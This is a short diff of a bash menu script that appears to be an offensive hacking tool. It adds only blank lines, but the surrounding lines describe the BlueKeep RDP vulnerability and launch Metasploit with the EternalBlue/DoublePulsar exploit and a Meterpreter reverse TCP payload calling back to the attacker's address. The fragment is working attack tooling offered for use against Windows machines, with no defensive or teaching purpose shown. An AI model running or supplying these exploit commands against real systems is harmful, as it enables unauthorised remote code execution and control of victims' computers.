@@ -76,6 +76,7 @@ echo -e "$white[$green$n6$white] Back to main menu"
 
 }
 
+
 function info_b(){
 echo -e "$blue
 BlueKeep $green(CVE-2019-0708)$white is a security vulnerability that was discovered in Microsoft's Remote Desktop Protocol, which allows for the possibility of remote code execution.$blue
@@ -272,6 +273,7 @@ exploit; "
 
 elif [[ $ch == "3" ]]; then
 echo ""
+
 msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 set payload windows/meterpreter/reverse_tcp;
 set lhost $loc_ip;
